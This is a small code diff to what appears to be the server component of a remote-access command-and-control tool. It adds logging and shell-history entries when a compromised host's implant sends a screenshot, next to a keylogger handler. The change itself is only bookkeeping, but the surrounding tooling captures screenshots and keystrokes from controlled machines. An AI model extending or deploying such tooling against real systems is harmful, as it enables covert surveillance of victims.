@@ -62,6 +62,9 @@ class HTTPDParser:
 
     def screenshot(self, guid, data):
         (cmd, data) = data.split(" ", 1)
+        shell = self.db.get_prompt(guid).decode().split(" ")[1]
+        Log.log_event("Screenshot", "Received (%s)" % shell)
+        self.db.append_shell_data(guid, "[%s] Screenshot Received\n\n" % (Utils.timestamp()))
         Log.log_screenshot(guid, data)
 
     def keylogger(self, guid, data):
